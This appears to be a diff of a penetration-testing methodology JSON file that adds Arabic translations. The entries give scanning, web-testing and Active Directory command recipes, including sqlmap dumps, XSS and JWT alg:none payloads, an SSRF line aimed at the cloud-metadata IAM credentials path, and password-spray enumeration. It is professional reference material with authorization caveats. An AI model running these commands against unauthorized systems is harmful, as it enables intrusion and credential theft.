         "commands": [
           {
             "id": "r2c1",
-            "title": "Host Discovery + masscan + nmap",
-            "purpose": "Find all live hosts and services \u2014 the core scanning workflow",
+            "title": {
+              "en": "Host Discovery + masscan + nmap",
+              "ar": "اكتشاف المضيفين + masscan + nmap"
+            },
+            "purpose": {
+              "en": "Find all live hosts and services — the core scanning workflow",
+              "ar": "إيجاد جميع المضيفين والخدمات الحيّة — سير العمل الأساسي للفحص"
+            },
             "cmd": "# 1. Host discovery:\nnmap -sn -PE -PS21,22,23,80,443,445,3389 -PU53,161 {CIDR} -oA hosts\ngrep 'Up' hosts.gnmap | awk '{print $2}' > live_ips.txt\n\n# 2. Fast all-port scan:\nsudo masscan {CIDR} -p1-65535 --rate=5000 -oG masscan.txt\ngrep 'open' masscan.txt | awk '{print $4}' | cut -d'/' -f1 | sort -un | paste -sd',' > open_ports.txt\n\n# 3. Deep service scan on discovered ports:\nnmap -p $(cat open_ports.txt) -sV -sC -O --min-rate 3000 -T4 -oA nmap_svc {TARGET}",
             "example": "sudo masscan 192.168.1.0/24 -p1-65535 --rate=5000 -oG masscan.txt\nnmap -p 22,80,443,445 -sV -sC -O -T4 -oA nmap_svc 192.168.1.100",
             "flags": [
               {
                 "f": "-sn",
-                "d": "Ping only (no ports)"
+                "d": {
+                  "en": "Ping only (no ports)",
+                  "ar": "فحص ping فقط (دون منافذ)"
+                }
               },
               {
                 "f": "-PE -PS",
-                "d": "ICMP + TCP ping (bypasses ICMP blocks)"
+                "d": {
+                  "en": "ICMP + TCP ping (bypasses ICMP blocks)",
+                  "ar": "ICMP + TCP ping (يتجاوز حجب ICMP)"
+                }
               },
               {
                 "f": "--rate=5000",
-                "d": "masscan: pkts/sec"
+                "d": {
+                  "en": "masscan: pkts/sec",
+                  "ar": "masscan: حزم/ثانية"
+                }
               },
               {
                 "f": "-sV",
-                "d": "Service version detection"
+                "d": {
+                  "en": "Service version detection",
+                  "ar": "كشف إصدار الخدمة"
+                }
               },
               {
                 "f": "-sC",
-                "d": "Default safe NSE scripts"
+                "d": {
+                  "en": "Default safe NSE scripts",
+                  "ar": "سكربتات NSE الآمنة الافتراضية"
+                }
               },
               {
                 "f": "-O",
-                "d": "OS detection"
+                "d": {
+                  "en": "OS detection",
+                  "ar": "كشف نظام التشغيل"
+                }
               },
               {
                 "f": "-T4",
-                "d": "Aggressive timing"
+                "d": {
+                  "en": "Aggressive timing",
+                  "ar": "توقيت عدواني"
+                }
               }
             ],
-            "note": "WORKFLOW: masscan for speed \u2192 extract ports \u2192 nmap for accuracy. Never nmap -p- at default speed on /24 (takes hours).",
-            "out": "All live hosts, open ports, service versions, OS fingerprints"
+            "note": {
+              "en": "WORKFLOW: masscan for speed → extract ports → nmap for accuracy. Never nmap -p- at default speed on /24 (takes hours).",
+              "ar": "سير العمل: masscan للسرعة ← استخراج المنافذ ← nmap للدقة. لا تستخدم nmap -p- بالسرعة الافتراضية على شبكة /24 أبداً (يستغرق ساعات)."
+            },
+            "out": {
+              "en": "All live hosts, open ports, service versions, OS fingerprints",
+              "ar": "جميع المضيفين الحيّين، المنافذ المفتوحة، إصدارات الخدمات، بصمات نظام التشغيل"
+            }
           },
           {
             "id": "r2c2",
-            "title": "UDP Scan + Web Enumeration",
-            "purpose": "Find UDP services and hidden web directories/VHosts",
+            "title": {
+              "en": "UDP Scan + Web Enumeration",
+              "ar": "فحص UDP + حصر الويب"
+            },
+            "purpose": {
+              "en": "Find UDP services and hidden web directories/VHosts",
+              "ar": "إيجاد خدمات UDP ودلائل/مضيفين افتراضيين مخفيين"
+            },
             "cmd": "# UDP scan (never skip this):\nsudo nmap -sU -F --min-rate 1000 -oA udp_scan {TARGET}\n\n# Web directory brute force:\ngobuster dir -u {URL} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,asp,aspx,bak,zip,conf -t 40 -o gobuster.txt\n\n# VHost discovery:\nffuf -u {URL} -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs {BASELINE_SIZE}\n\n# Tech + WAF fingerprinting:\nwhatweb -v {URL} | tee whatweb.txt\nwafw00f {URL} -v",
             "example": "sudo nmap -sU -F --min-rate 1000 -oA udp 192.168.1.100\ngobuster dir -u https://acmecorp.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,bak -t 40",
             "flags": [
               {
                 "f": "-sU",
-                "d": "UDP scan (requires root)"
+                "d": {
+                  "en": "UDP scan (requires root)",
+                  "ar": "فحص UDP (يتطلب صلاحيات الجذر)"
+                }
               },
               {
                 "f": "-F",
-                "d": "Top 100 UDP ports"
+                "d": {
+                  "en": "Top 100 UDP ports",
+                  "ar": "أكثر 100 منفذ UDP شيوعاً"
+                }
               },
               {
                 "f": "-x",
-                "d": "gobuster: file extensions to test"
+                "d": {
+                  "en": "gobuster: file extensions to test",
+                  "ar": "gobuster: امتدادات الملفات للاختبار"
+                }
               },
               {
                 "f": "-fs",
-                "d": "ffuf: filter response size (remove false positives)"
+                "d": {
+                  "en": "ffuf: filter response size (remove false positives)",
+                  "ar": "ffuf: تصفية حجم الاستجابة (إزالة النتائج الخاطئة)"
+                }
               }
             ],
-            "note": "UDP 161 (SNMP) with 'public' community = routing tables, ARP cache, running processes, full network map.",
-            "out": "Open UDP services + hidden web paths + virtual hosts + WAF vendor"
+            "note": {
+              "en": "UDP 161 (SNMP) with 'public' community = routing tables, ARP cache, running processes, full network map.",
+              "ar": "منفذ UDP 161 (SNMP) بسلسلة مجتمع 'public' = جداول التوجيه، ذاكرة ARP، العمليات الجارية، خريطة شبكة كاملة."
+            },
+            "out": {
+              "en": "Open UDP services + hidden web paths + virtual hosts + WAF vendor",
+              "ar": "خدمات UDP مفتوحة + مسارات ويب مخفية + مضيفون افتراضيون + مزوّد جدار الحماية"
+            }
           }
         ],
         "tools": [
@@ -398,82 +815,166 @@
           "wafw00f",
           "httpx"
         ],
-        "deliverable": "Asset inventory: IPs, ports, services, web apps, technologies",
-        "tip": "masscan for speed, nmap for accuracy \u2014 always this order. SNMP with public community string is still one of the most reliable network information leaks."
+        "deliverable": {
+          "en": "Asset inventory: IPs, ports, services, web apps, technologies",
+          "ar": "جرد الأصول: عناوين IP، المنافذ، الخدمات، تطبيقات الويب، التقنيات"
+        },
+        "tip": {
+          "en": "masscan for speed, nmap for accuracy — always this order. SNMP with public community string is still one of the most reliable network information leaks.",
+          "ar": "masscan للسرعة، nmap للدقة — بهذا الترتيب دائماً. SNMP بسلسلة مجتمع (community string) عامة لا يزال أحد أكثر تسريبات معلومات الشبكة موثوقية."
+        }
       }
     ]
   },
   {
     "id": "scan",
-    "label": "Scanning",
-    "short": "Scan",
-    "icon": "\ud83d\udce1",
+    "label": {
+      "en": "Scanning",
+      "ar": "الفحص"
+    },
+    "short": {
+      "en": "Scan",
+      "ar": "فحص"
+    },
+    "icon": "📡",
     "color": "#06b6d4",
-    "desc": "Vulnerability scanning, web app testing, Active Directory enumeration",
+    "desc": {
+      "en": "Vulnerability scanning, web app testing, Active Directory enumeration",
+      "ar": "فحص الثغرات، اختبار تطبيقات الويب، حصر Active Directory"
+    },
     "steps": [
       {
         "id": "s1",
-        "title": "Network Vulnerability Scanning",
+        "title": {
+          "en": "Network Vulnerability Scanning",
+          "ar": "فحص ثغرات الشبكة"
+        },
         "priority": "critical",
-        "summary": "Automated vuln scans \u2014 authenticated finds 3-5x more. Always push for credentials.",
+        "summary": {
+          "en": "Automated vuln scans — authenticated finds 3-5x more. Always push for credentials.",
+          "ar": "فحص آلي للثغرات — الفحص الموثَّق يكتشف 3-5 أضعاف. اطلب بيانات الاعتماد دائماً."
+        },
         "checklist": [
-          "nmap NSE vulnerability scripts on all hosts",
-          "SMB checks: EternalBlue (MS17-010), PrintNightmare",
-          "SSL/TLS audit: Heartbleed, POODLE, weak ciphers",
-          "SNMP enumeration on UDP 161",
-          "Authenticated Nessus/OpenVAS scan if available",
-          "Manual verify every Critical/High before reporting"
+          {
+            "en": "nmap NSE vulnerability scripts on all hosts",
+            "ar": "سكربتات nmap NSE لفحص الثغرات على جميع المضيفين"
+          },
+          {
+            "en": "SMB checks: EternalBlue (MS17-010), PrintNightmare",
+            "ar": "فحوصات SMB: EternalBlue (MS17-010)، PrintNightmare"
+          },
+          {
+            "en": "SSL/TLS audit: Heartbleed, POODLE, weak ciphers",
+            "ar": "تدقيق SSL/TLS: Heartbleed، POODLE، خوارزميات تشفير ضعيفة"
+          },
+          {
+            "en": "SNMP enumeration on UDP 161",
+            "ar": "حصر SNMP على منفذ UDP 161"
+          },
+          {
+            "en": "Authenticated Nessus/OpenVAS scan if available",
+            "ar": "فحص موثَّق عبر Nessus/OpenVAS إن توفر"
+          },
+          {
+            "en": "Manual verify every Critical/High before reporting",
+            "ar": "تحقق يدوي من كل ثغرة حرجة/عالية قبل التسليم"
+          }
         ],
         "commands": [
           {
             "id": "s1c1",
-            "title": "nmap NSE Vuln Scan + SMB + SSL",
-            "purpose": "Built-in vulnerability detection \u2014 no additional license required",
+            "title": {
+              "en": "nmap NSE Vuln Scan + SMB + SSL",
+              "ar": "فحص ثغرات nmap NSE + SMB + SSL"
+            },
+            "purpose": {
+              "en": "Built-in vulnerability detection — no additional license required",
+              "ar": "كشف ثغرات مدمج — دون الحاجة لترخيص إضافي"
+            },
             "cmd": "# General vulnerability scan:\nnmap -sV --script='vuln,safe,auth' -p {PORTS} -oA nmap_vuln {TARGET}\n\n# SMB vulnerability checks:\nnmap --script='smb-vuln*' -p 139,445 {TARGET}\n\n# SSL/TLS audit:\nnmap --script='ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-dh-params' -p 443,8443 {TARGET}\n\n# SNMP:\nnmap -sU --script=snmp-info --script-args snmpcommunity=public -p 161 {TARGET}",
             "example": "nmap -sV --script='vuln,safe' -p 22,80,443,445 192.168.1.100 -oA nmap_vuln\nnmap --script='smb-vuln*' -p 139,445 192.168.1.100",
             "flags": [
               {
                 "f": "--script=vuln",
-                "d": "All vulnerability detection scripts"
+                "d": {
+                  "en": "All vulnerability detection scripts",
+                  "ar": "جميع سكربتات كشف الثغرات"
+                }
               },
               {
                 "f": "--script=safe",
-                "d": "Won't crash services"
+                "d": {
+                  "en": "Won't crash services",
+                  "ar": "لن تُعطّل الخدمات"
+                }
               },
               {
                 "f": "smb-vuln*",
-                "d": "Wildcard: all SMB vuln scripts"
+                "d": {
+                  "en": "Wildcard: all SMB vuln scripts",
+                  "ar": "حرف بدل: جميع سكربتات ثغرات SMB"
+                }
               }
             ],
-            "note": "EternalBlue (MS17-010) VULNERABLE = call client immediately per emergency escalation. Don't proceed without notification.",
-            "out": "CVEs, misconfigurations, default credentials, vulnerable service versions"
+            "note": {
+              "en": "EternalBlue (MS17-010) VULNERABLE = call client immediately per emergency escalation. Don't proceed without notification.",
+              "ar": "إن وُجدت EternalBlue (MS17-010) ضعيفة = اتصل بالعميل فوراً وفق إجراءات التصعيد الطارئة. لا تتابع دون إشعار."
+            },
+            "out": {
+              "en": "CVEs, misconfigurations, default credentials, vulnerable service versions",
+              "ar": "CVEs، إعدادات خاطئة، بيانات اعتماد افتراضية، إصدارات خدمة ضعيفة"
+            }
           },
           {
             "id": "s1c2",
-            "title": "testssl.sh + SNMP Enumeration",
-            "purpose": "Comprehensive SSL audit and full SNMP data extraction",
+            "title": {
+              "en": "testssl.sh + SNMP Enumeration",
+              "ar": "testssl.sh + حصر SNMP"
+            },
+            "purpose": {
+              "en": "Comprehensive SSL audit and full SNMP data extraction",
+              "ar": "تدقيق SSL شامل واستخراج بيانات SNMP كاملة"
+            },
             "cmd": "# Full SSL audit:\ngit clone https://github.com/drwetter/testssl.sh && cd testssl.sh\n./testssl.sh --html ~/pentests/{CLIENT}/scans/ssl.html {TARGET}:443\n./testssl.sh --severity HIGH {TARGET}:443\n\n# SNMP community string brute force:\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {TARGET}\n\n# SNMP full dump:\nsnmpwalk -v2c -c public {TARGET} . | tee snmp_full.txt",
             "example": "./testssl.sh --html ssl_audit.html acmecorp.com:443\nsnmpwalk -v2c -c public 192.168.1.1 .",
             "flags": [
               {
                 "f": "--html",
-                "d": "Generate HTML report"
+                "d": {
+                  "en": "Generate HTML report",
+                  "ar": "إنشاء تقرير HTML"
+                }
               },
               {
                 "f": "--severity HIGH",
-                "d": "Show only HIGH/CRITICAL findings"
+                "d": {
+                  "en": "Show only HIGH/CRITICAL findings",
+                  "ar": "إظهار نتائج HIGH/CRITICAL فقط"
+                }
               },
               {
                 "f": "-v2c",
-                "d": "SNMP version 2c"
+                "d": {
+                  "en": "SNMP version 2c",
+                  "ar": "إصدار SNMP 2c"
+                }
               },
               {
                 "f": "-c public",
-                "d": "Community string (also try: private, manager)"
+                "d": {
+                  "en": "Community string (also try: private, manager)",
+                  "ar": "سلسلة المجتمع (جرّب أيضاً: private، manager)"
+                }
               }
             ],
-            "note": "Common SSL findings: TLS 1.0/1.1, RC4/3DES ciphers, self-signed cert, Heartbleed. SNMP 'public' = full network topology.",
-            "out": "SSL vulnerability list + routing tables, processes, software list (SNMP)"
+            "note": {
+              "en": "Common SSL findings: TLS 1.0/1.1, RC4/3DES ciphers, self-signed cert, Heartbleed. SNMP 'public' = full network topology.",
+              "ar": "نتائج SSL شائعة: TLS 1.0/1.1، خوارزميات RC4/3DES، شهادة موقّعة ذاتياً، Heartbleed. SNMP بسلسلة public = طوبولوجيا شبكة كاملة."
+            },
+            "out": {
+              "en": "SSL vulnerability list + routing tables, processes, software list (SNMP)",
+              "ar": "قائمة ثغرات SSL + جداول توجيه، عمليات، قائمة برامج (SNMP)"
+            }
           }
         ],
         "tools": [
@@ -484,108 +985,225 @@
           "Nessus",
           "OpenVAS"
         ],
-        "deliverable": "Validated vulnerability list with CVSS scores",
-        "tip": "Never report raw scanner output. Verify every Critical/High manually. One false positive = immediate credibility loss."
+        "deliverable": {
+          "en": "Validated vulnerability list with CVSS scores",
+          "ar": "قائمة ثغرات مُتحقَّق منها مع درجات CVSS"
+        },
+        "tip": {
+          "en": "Never report raw scanner output. Verify every Critical/High manually. One false positive = immediate credibility loss.",
+          "ar": "لا تُسلّم نتائج الماسح الخام أبداً. تحقق يدوياً من كل ثغرة حرجة/عالية. نتيجة خاطئة واحدة = فقدان فوري للمصداقية."
+        }
       },
       {
         "id": "s2",
-        "title": "Web Application Testing",
+        "title": {
+          "en": "Web Application Testing",
+          "ar": "اختبار تطبيقات الويب"
+        },
         "priority": "critical",
-        "summary": "OWASP Top 10 \u2014 automated baseline then deep manual analysis with Burp Suite.",
+        "summary": {
+          "en": "OWASP Top 10 — automated baseline then deep manual analysis with Burp Suite.",
+          "ar": "OWASP Top 10 — فحص آلي أساسي ثم تحليل يدوي عميق باستخدام Burp Suite."
+        },
         "checklist": [
-          "Nikto \u2014 web server misconfiguration scan",
-          "Nuclei \u2014 CVE and template-based scanning",
-          "Security headers audit",
-          "Burp Suite active scan (authenticated)",
-          "SQLi \u2014 all input fields and URL params",
-          "XSS \u2014 reflected, stored, DOM-based",
-          "IDOR \u2014 object ID manipulation",
-          "SSRF \u2014 internal service and cloud metadata",
-          "JWT analysis if tokens present",
-          "CMS scan if WordPress/Drupal detected",
-          "JavaScript file secret scanning"
+          {
+            "en": "Nikto — web server misconfiguration scan",
+            "ar": "Nikto — فحص إعدادات خادم الويب الخاطئة"
+          },
+          {
+            "en": "Nuclei — CVE and template-based scanning",
+            "ar": "Nuclei — فحص قائم على CVE والقوالب"
+          },
+          {
+            "en": "Security headers audit",
+            "ar": "تدقيق رؤوس الأمان (Security headers)"
+          },
+          {
+            "en": "Burp Suite active scan (authenticated)",
+            "ar": "فحص نشط عبر Burp Suite (موثَّق)"
+          },
+          {
+            "en": "SQLi — all input fields and URL params",
+            "ar": "حقن SQL — جميع حقول الإدخال ومعاملات الرابط"
+          },
+          {
+            "en": "XSS — reflected, stored, DOM-based",
+            "ar": "XSS — منعكس، مخزّن، قائم على DOM"
+          },
+          {
+            "en": "IDOR — object ID manipulation",
+            "ar": "IDOR — التلاعب بمعرّفات الكائنات"
+          },
+          {
+            "en": "SSRF — internal service and cloud metadata",
+            "ar": "SSRF — الوصول لخدمة داخلية أو بيانات تعريف سحابية"
+          },
+          {
+            "en": "JWT analysis if tokens present",
+            "ar": "تحليل JWT إن وُجدت رموز"
+          },
+          {
+            "en": "CMS scan if WordPress/Drupal detected",
+            "ar": "فحص نظام إدارة المحتوى إن اكتُشف WordPress/Drupal"
+          },
+          {
+            "en": "JavaScript file secret scanning",
+            "ar": "فحص أسرار ملفات JavaScript"
+          }
         ],
         "commands": [
           {
             "id": "s2c1",
-            "title": "Nikto + Nuclei + Headers",
-            "purpose": "Automated baseline scan \u2014 run first on every web target",
+            "title": {
+              "en": "Nikto + Nuclei + Headers",
+              "ar": "Nikto + Nuclei + الرؤوس"
+            },
+            "purpose": {
+              "en": "Automated baseline scan — run first on every web target",
+              "ar": "فحص أساسي آلي — شغّله أولاً على كل هدف ويب"
+            },
             "cmd": "# Nikto:\nnikto -h {URL} -o nikto.html -Format htm\n\n# Nuclei:\nnuclei -update-templates\nnuclei -u {URL} -t /root/nuclei-templates/ -severity critical,high,medium -o nuclei.txt -stats\nnuclei -u {URL} -t /root/nuclei-templates/cves/ -o nuclei_cves.txt\n\n# Security headers audit:\ncurl -IsS {URL} | grep -iE 'Content-Security|X-Frame-Options|Strict-Transport|X-Content-Type|Referrer-Policy'",
             "example": "nikto -h https://acmecorp.com -o nikto.html -Format htm\nnuclei -u https://acmecorp.com -t /root/nuclei-templates/ -severity critical,high -stats",
             "flags": [
               {
                 "f": "-Format htm",
-                "d": "Nikto: HTML output"
+                "d": {
+                  "en": "Nikto: HTML output",
+                  "ar": "Nikto: إخراج HTML"
+                }
               },
               {
                 "f": "-severity",
-                "d": "nuclei: filter severity level"
+                "d": {
+                  "en": "nuclei: filter severity level",
+                  "ar": "nuclei: تصفية مستوى الخطورة"
+                }
               },
               {
                 "f": "-stats",
-                "d": "nuclei: show live statistics"
+                "d": {
+                  "en": "nuclei: show live statistics",
+                  "ar": "nuclei: إظهار إحصائيات حيّة"
+                }
               },
               {
                 "f": "-I",
-                "d": "curl: HEAD request (headers only)"
+                "d": {
+                  "en": "curl: HEAD request (headers only)",
+                  "ar": "curl: طلب HEAD (الرؤوس فقط)"
+                }
               }
             ],
-            "note": "Check /root/nuclei-templates/exposures/ \u2014 exposed panels and config files are often instant wins.",
-            "out": "CVE matches, exposed panels, default creds, misconfigurations, missing security headers"
+            "note": {
+              "en": "Check /root/nuclei-templates/exposures/ — exposed panels and config files are often instant wins.",
+              "ar": "افحص /root/nuclei-templates/exposures/ — اللوحات وملفات الإعداد المكشوفة غالباً نتائج فورية."
+            },
+            "out": {
+              "en": "CVE matches, exposed panels, default creds, misconfigurations, missing security headers",
+              "ar": "تطابقات CVE، لوحات مكشوفة، بيانات اعتماد افتراضية، إعدادات خاطئة، رؤوس أمان مفقودة"
+            }
           },
           {
             "id": "s2c2",
-            "title": "SQLMap + Burp Suite Workflow",
-            "purpose": "SQL injection and comprehensive manual web testing",
+            "title": {
+              "en": "SQLMap + Burp Suite Workflow",
+              "ar": "سير عمل SQLMap وBurp Suite"
+            },
+            "purpose": {
+              "en": "SQL injection and comprehensive manual web testing",
+              "ar": "حقن SQL واختبار ويب يدوي شامل"
+            },
             "cmd": "# SQLMap from Burp request file (most reliable):\nsqlmap -r burp_request.txt --dbs --batch\n\n# SQLMap direct URL:\nsqlmap -u '{URL}?id=1' --dbs --batch -v 1\n\n# Dump table (max 5 rows to prove access):\nsqlmap -u '{URL}?id=1' -D {DB} -T {TABLE} --dump --stop 5 --batch\n\n# Burp Suite proxy setup:\n# Firefox: Settings -> Network -> Manual Proxy -> 127.0.0.1:8080\n# Install Burp CA: browse http://burpsuite -> Download CA -> import in Firefox\n# Ctrl+R = Send to Repeater | Ctrl+I = Send to Intruder\n\n# IDOR test in Repeater:\n# GET /api/users/1234 -> change to /api/users/1235 -> 200 OK = IDOR\n# Auth bypass: {\"role\":\"user\"} -> {\"role\":\"admin\"}\n# SSRF: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
             "example": "sqlmap -r burp_login.txt --dbs --batch\nsqlmap -u 'https://acmecorp.com/item?id=1' -D acme_db -T users --dump --stop 5 --batch",
             "flags": [
               {
                 "f": "-r",
-                "d": "Read from Burp saved request file (most reliable)"
+                "d": {
+                  "en": "Read from Burp saved request file (most reliable)",
+                  "ar": "القراءة من ملف طلب محفوظ من Burp (الأكثر موثوقية)"
+                }
               },
               {
                 "f": "--batch",
-                "d": "Auto-answer all sqlmap prompts"
+                "d": {
+                  "en": "Auto-answer all sqlmap prompts",
+                  "ar": "الإجابة التلقائية على جميع مطالبات sqlmap"
+                }
               },
               {
                 "f": "--stop 5",
-                "d": "CRITICAL: 5 rows max \u2014 prove access, never dump PII"
+                "d": {
+                  "en": "CRITICAL: 5 rows max — prove access, never dump PII",
+                  "ar": "حرِج: 5 صفوف كحد أقصى — أثبت الوصول، لا تُفرغ بيانات شخصية أبداً"
+                }
               },
               {
                 "f": "--dbs",
-                "d": "Enumerate all databases"
+                "d": {
+                  "en": "Enumerate all databases",
+                  "ar": "حصر جميع قواعد البيانات"
+                }
               }
             ],
-            "note": "NEVER use --os-shell without explicit written authorization. Proving access = the goal, not extracting all data.",
-            "out": "Database names, tables, sample rows confirming SQL injection"
+            "note": {
+              "en": "NEVER use --os-shell without explicit written authorization. Proving access = the goal, not extracting all data.",
+              "ar": "لا تستخدم --os-shell أبداً دون تفويض كتابي صريح. إثبات الوصول هو الهدف، وليس استخراج كل البيانات."
+            },
+            "out": {
+              "en": "Database names, tables, sample rows confirming SQL injection",
+              "ar": "أسماء قواعد البيانات، الجداول، صفوف عينة تؤكد حقن SQL"
+            }
           },
           {
             "id": "s2c3",
-            "title": "XSS + JWT + WPScan",
-            "purpose": "JavaScript injection, JWT token attacks, and CMS scanning",
-            "cmd": "# XSS payloads (use alert(document.domain) \u2014 never cookie theft):\n# <script>alert(document.domain)</script>\n# \"><img src=x onerror=alert(document.domain)>\nxsstrike -u '{URL}?q=FUZZ' --crawl\n\n# JWT analysis:\npip3 install jwt_tool --break-system-packages\npython3 jwt_tool.py {JWT_TOKEN} -T\npython3 jwt_tool.py {JWT_TOKEN} -X a\nhashcat -m 16500 {JWT_TOKEN} /usr/share/wordlists/rockyou.txt --force\n\n# WordPress:\nwpscan --url {URL} --enumerate ap,at,cb,dbe,u --api-token {TOKEN} -o wpscan.txt",
+            "title": {
+              "en": "XSS + JWT + WPScan",
+              "ar": "XSS + JWT + WPScan"
+            },
+            "purpose": {
+              "en": "JavaScript injection, JWT token attacks, and CMS scanning",
+              "ar": "حقن JavaScript، هجمات رمز JWT، وفحص نظام إدارة المحتوى"
+            },
+            "cmd": "# XSS payloads (use alert(document.domain) — never cookie theft):\n# <script>alert(document.domain)</script>\n# \"><img src=x onerror=alert(document.domain)>\nxsstrike -u '{URL}?q=FUZZ' --crawl\n\n# JWT analysis:\npip3 install jwt_tool --break-system-packages\npython3 jwt_tool.py {JWT_TOKEN} -T\npython3 jwt_tool.py {JWT_TOKEN} -X a\nhashcat -m 16500 {JWT_TOKEN} /usr/share/wordlists/rockyou.txt --force\n\n# WordPress:\nwpscan --url {URL} --enumerate ap,at,cb,dbe,u --api-token {TOKEN} -o wpscan.txt",
             "example": "xsstrike -u 'https://acmecorp.com/search?q=FUZZ' --crawl\npython3 jwt_tool.py eyJhbGc... -X a\nwpscan --url https://acmecorp.com --enumerate ap,at,u --api-token YOUR_TOKEN",
             "flags": [
               {
                 "f": "--crawl",
-                "d": "XSSStrike: test all discovered inputs"
+                "d": {
+                  "en": "XSSStrike: test all discovered inputs",
+                  "ar": "XSSStrike: اختبار جميع المدخلات المكتشفة"
+                }
               },
               {
                 "f": "-X a",
-                "d": "jwt_tool: algorithm confusion (alg:none) attack"
+                "d": {
+                  "en": "jwt_tool: algorithm confusion (alg:none) attack",
+                  "ar": "jwt_tool: هجوم التباس الخوارزمية (alg:none)"
+                }
               },
               {
                 "f": "-m 16500",
-                "d": "hashcat: JWT HS256 crack mode"
+                "d": {
+                  "en": "hashcat: JWT HS256 crack mode",
+                  "ar": "hashcat: وضع كسر JWT HS256"
+                }
               },
               {
                 "f": "--enumerate ap",
-                "d": "wpscan: all plugins with vuln data"
+                "d": {
+                  "en": "wpscan: all plugins with vuln data",
+                  "ar": "wpscan: جميع الإضافات مع بيانات الثغرات"
+                }
               }
             ],
-            "note": "XSS: use alert(document.domain) NOT document.cookie. Prove execution, not steal real cookies.",
-            "out": "XSS firing in browser + JWT admin access + vulnerable WordPress plugins"
+            "note": {
+              "en": "XSS: use alert(document.domain) NOT document.cookie. Prove execution, not steal real cookies.",
+              "ar": "XSS: استخدم alert(document.domain) وليس document.cookie. أثبت التنفيذ، لا تسرق كوكيز حقيقية."
+            },
+            "out": {
+              "en": "XSS firing in browser + JWT admin access + vulnerable WordPress plugins",
+              "ar": "XSS يعمل في المتصفح + وصول مدير عبر JWT + إضافات WordPress ضعيفة"
+            }
           }
         ],
         "tools": [
@@ -598,104 +1216,209 @@
           "jwt_tool",
           "curl"
         ],
-        "deliverable": "Web app findings with manual verification: request + response + impact per finding",
-        "tip": "Never paste scanner HTML into your report. Rewrite each finding with your own manual evidence. The analysis is what clients pay for."
+        "deliverable": {
+          "en": "Web app findings with manual verification: request + response + impact per finding",
+          "ar": "نتائج تطبيقات الويب مع تحقق يدوي: الطلب + الاستجابة + الأثر لكل نتيجة"
+        },
+        "tip": {
+          "en": "Never paste scanner HTML into your report. Rewrite each finding with your own manual evidence. The analysis is what clients pay for.",
+          "ar": "لا تلصق HTML الماسح في تقريرك أبداً. أعد صياغة كل نتيجة بدليلك اليدوي الخاص. التحليل هو ما يدفع العملاء ثمنه."
+        }
       },
       {
         "id": "s3",
-        "title": "Active Directory Enumeration",
+        "title": {
+          "en": "Active Directory Enumeration",
+          "ar": "حصر Active Directory"
+        },
         "priority": "high",
-        "summary": "Full Windows domain enumeration \u2014 foundation for all AD attack chains.",
+        "summary": {
+          "en": "Full Windows domain enumeration — foundation for all AD attack chains.",
+          "ar": "حصر شامل لنطاق Windows — الأساس لجميع سلاسل هجوم AD."
+        },
         "checklist": [
-          "Domain controller and domain name discovery",
-          "User, group, OU enumeration",
-          "Password policy retrieval (critical for spray timing)",
-          "AS-REP Roastable accounts (no pre-auth)",
-          "Kerberoastable service accounts (SPNs set)",
-          "BloodHound collection and attack path analysis",
-          "SMB share enumeration and access testing"
+          {
+            "en": "Domain controller and domain name discovery",
+            "ar": "اكتشاف وحدة تحكم النطاق واسم النطاق"
+          },
+          {
+            "en": "User, group, OU enumeration",
+            "ar": "حصر المستخدمين والمجموعات والوحدات التنظيمية"
+          },
+          {
+            "en": "Password policy retrieval (critical for spray timing)",
+            "ar": "استرجاع سياسة كلمات المرور (حرِج لتوقيت رش كلمات المرور)"
+          },
+          {
+            "en": "AS-REP Roastable accounts (no pre-auth)",
+            "ar": "حسابات قابلة لـ AS-REP Roasting (بدون مصادقة مسبقة)"
+          },
+          {
+            "en": "Kerberoastable service accounts (SPNs set)",
+            "ar": "حسابات خدمة قابلة لـ Kerberoasting (SPN مُعرَّف)"
+          },
+          {
+            "en": "BloodHound collection and attack path analysis",
+            "ar": "جمع بيانات BloodHound وتحليل مسارات الهجوم"
+          },
+          {
+            "en": "SMB share enumeration and access testing",
+            "ar": "حصر مشاركات SMB واختبار الوصول إليها"
+          }
         ],
         "commands": [
           {
             "id": "s3c1",
-            "title": "CrackMapExec AD Enumeration",
-            "purpose": "Swiss army knife for SMB and Active Directory recon",
+            "title": {
+              "en": "CrackMapExec AD Enumeration",
+              "ar": "حصر AD عبر CrackMapExec"
+            },
+            "purpose": {
+              "en": "Swiss army knife for SMB and Active Directory recon",
+              "ar": "أداة شاملة لاستطلاع SMB وActive Directory"
+            },
             "cmd": "crackmapexec smb {DC_IP} -u '' -p ''\ncrackmapexec smb {DC_IP} -u {USER} -p '{PASS}' --users | tee ad_users.txt\ncrackmapexec smb {DC_IP} -u {USER} -p '{PASS}' --groups\ncrackmapexec smb {RANGE} -u {USER} -p '{PASS}' --shares\ncrackmapexec smb {DC_IP} -u {USER} -p '{PASS}' --pass-pol",
             "example": "crackmapexec smb 192.168.1.10 -u 'john.doe' -p 'Password123' --users",
             "flags": [
               {
                 "f": "--users",
-                "d": "List all domain users"
+                "d": {
+                  "en": "List all domain users",
+                  "ar": "سرد جميع مستخدمي النطاق"
+                }
               },
               {
                 "f": "--groups",
-                "d": "List all domain groups"
+                "d": {
+                  "en": "List all domain groups",
+                  "ar": "سرد جميع مجموعات النطاق"
+                }
               },
               {
                 "f": "--shares",
-                "d": "List accessible SMB shares"
+                "d": {
+                  "en": "List accessible SMB shares",
+                  "ar": "سرد مشاركات SMB المتاحة"
+                }
               },
               {
                 "f": "--pass-pol",
-                "d": "Get password policy (critical for spray timing)"
+                "d": {
+                  "en": "Get password policy (critical for spray timing)",
+                  "ar": "الحصول على سياسة كلمات المرور (حرِج لتوقيت الرش)"
+                }
               },
               {
                 "f": "(Pwn3d!)",
-                "d": "Output: you have local admin on that host"
+                "d": {
+                  "en": "Output: you have local admin on that host",
+                  "ar": "المخرج: لديك صلاحيات مدير محلي على ذلك المضيف"
+                }
               }
             ],
-            "note": "Save --users output as your spray target list. (Pwn3d!) = local admin.",
-            "out": "Domain users, groups, shares, password policy"
+            "note": {
+              "en": "Save --users output as your spray target list. (Pwn3d!) = local admin.",
+              "ar": "احفظ مخرجات --users كقائمة أهداف الرش. (Pwn3d!) = مدير محلي."
+            },
